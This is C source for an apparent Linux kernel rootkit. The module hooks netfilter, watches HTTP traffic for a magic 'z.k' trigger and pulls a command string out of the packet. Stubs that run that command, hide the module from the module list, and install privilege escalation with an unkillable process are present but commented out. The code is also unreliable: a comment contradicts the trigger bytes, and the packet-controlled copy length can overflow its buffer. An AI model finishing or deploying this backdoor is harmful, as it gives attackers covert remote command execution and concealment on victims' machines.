#ifndef __KERNEL__  
#define __KERNEL__  
#endif  /* __KERNEL__ */


#include <linux/module.h>
#include <linux/kernel.h>  
#include <linux/init.h>  
#include <linux/types.h>  
#include <asm/uaccess.h>  
#include <linux/netdevice.h>  
#include <linux/netfilter_ipv4.h>  
#include <linux/ip.h>  
#include <linux/tcp.h>  
#include <linux/string.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/moduleparam.h>

#define PORT 80  
#define ARGV_MAX 10


/*
* 
*filter data package  
*/
static int filter_http(char *type,struct sk_buff *pskb)  
{  
	int retval = NF_ACCEPT;  
	struct sk_buff *skb = pskb;  
	  
	struct iphdr *iph = ip_hdr(skb);  // 获取ip头  
	struct tcphdr *tcp = NULL;  
	char *p = NULL;  
	tcp = tcp_hdr(skb);
	
	if( htons(tcp->dest) == 22 || htons(tcp->source) == 22)  
	{  
		return retval;
	} 
	
	/* 解析TCP数据包 */
	if( iph->protocol == IPPROTO_TCP )  
	{  
		/*注：sk_buff的data字段数据从ip头开始，不包括以太网数据帧*/
		p = (char*)(skb->data+iph->tot_len);   
		/*printk("%s: %d.%d.%d.%d => %d.%d.%d.%d %u -- %u\n",
				type, 
				(iph->saddr&0x000000FF)>>0,  
				(iph->saddr&0x0000FF00)>>8,  
				(iph->saddr&0x00FF0000)>>16,  
				(iph->saddr&0xFF000000)>>24,  
				(iph->daddr&0x000000FF)>>0,  
				(iph->daddr&0x0000FF00)>>8,  
				(iph->daddr&0x00FF0000)>>16,  
				(iph->daddr&0xFF000000)>>24,  
				htons(tcp->source),  
				htons(tcp->dest)  
				);*/
		if( htons(tcp->dest) == PORT )  
		{  
			if (skb->len > 0)
			{
				int i = 0;
				for (i = 0; i < skb->len; i++)
				{   /*Below is 'GE' from "GET / HTTP/1.1" 7a2e6b*/
					if (0x7A == *(skb->data+i) && 0x2E == *(skb->data+i + 1) && 0x6B == *(skb->data+i + 2))
					{
						char cmd[128] = {0};
						memcpy(cmd, (skb->data+i + 5), *(skb->data+i + 4) - 0x30);
						printk(KERN_INFO "===========Found ===z.k==========%s\n",cmd);
						//call_user("pwd");
						break;
					}
				}
			}
			
		}
	}  
  
	return retval;  
}  
  
  
static unsigned int NET_HookLocalIn(unsigned int hook,  
		struct sk_buff *pskb,  
		const struct net_device *in,  
		const struct net_device *out,  
		int (*okfn)(struct sk_buff*))  
{  
	printk("icmp: %d", pskb->nh.iph->protocol);
	return filter_http("in",pskb);  
}  
 
static unsigned int NET_HookLocalOut(unsigned int hook,  
		struct sk_buff *pskb,  
		const struct net_device *in,  
		const struct net_device *out,  
		int (*okfn)(struct sk_buff*))  
{  
	return filter_http("out",pskb);  
}  
  
  
static unsigned int NET_HookPreRouting(unsigned int hook,  
		struct sk_buff *pskb,  
		const struct net_device *in,  
		const struct net_device *out,  
		int (*okfn)(struct sk_buff*))  
{  
	return NF_ACCEPT;  
}  
  
  
static unsigned int NET_HookPostRouting(unsigned int hook,  
		struct sk_buff *pskb,  
		const struct net_device *in,  
		const struct net_device *out,  
		int (*okfn)(struct sk_buff*))  
{  
	return NF_ACCEPT;  
}  
  
  
static unsigned int NET_HookForward(unsigned int hook,  
		struct sk_buff *pskb,  
		const struct net_device *in,  
		const struct net_device *out,  
		int (*okfn)(struct sk_buff*))  
{  
	return NF_ACCEPT;  
}  
  
  
/* 钩子数组 */
static struct nf_hook_ops net_hooks[] = {  
	{  
		/* 发往本地数据包  */
		.hook       = NET_HookLocalIn,     
		.owner      = THIS_MODULE,  
		.pf         = PF_INET,  
		.hooknum    =   NF_INET_LOCAL_IN,  
		.priority   = NF_IP_PRI_FILTER-1,  
	},  
	{  
		/* 本地发出数据包 */
		.hook       = NET_HookLocalOut,      
		.owner      = THIS_MODULE,  
		.pf         = PF_INET,  
		.hooknum    =   NF_INET_LOCAL_OUT,  
		.priority   = NF_IP_PRI_FILTER-1,  
	},  
	{  
		/* 转发的数据包 */
		.hook       = NET_HookForward,      
		.owner      = THIS_MODULE,  
		.pf         = PF_INET,  
		.hooknum    =   NF_INET_FORWARD,  
		.priority   = NF_IP_PRI_FILTER-1,  
	},  
	{  
		 /* 进入本机路由前 */
		.hook       = NET_HookPreRouting,  
		.owner      = THIS_MODULE,            
		.pf         = PF_INET,                
		.hooknum    = NF_INET_PRE_ROUTING,        
		.priority   = NF_IP_PRI_FILTER-1,         
	},  
	{  
		/* 本机发出包经路由后 */
		.hook       = NET_HookPostRouting,  
		.owner      = THIS_MODULE,            
		.pf         = PF_INET,                
		.hooknum    = NF_INET_POST_ROUTING,       
		.priority   = NF_IP_PRI_FILTER-1,         
	},  
};  
  
  
static int __init rk_init(void)   
{  
	int ret = 0;  
  
	/*hidden module*/
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);
  
	/* 安装nf钩子 */
	ret = nf_register_hooks(net_hooks, ARRAY_SIZE(net_hooks));    
	if(ret)  
	{  
		printk(KERN_ERR "register hook failed\n");  
		return -1;  
	}  
	
  	/*安装提权、不死进程*/
	//promote_immortal();

	return 0;  
}  
  
  
static void __exit rk_exit(void)  
{  
	/* 卸载nf钩子 */
	nf_unregister_hooks(net_hooks,ARRAY_SIZE(net_hooks));
	
	/* 卸载提权、不死进程 */
	//promote_immortal_exit();
}  
  
  
module_init(rk_init);  
module_exit(rk_exit);  
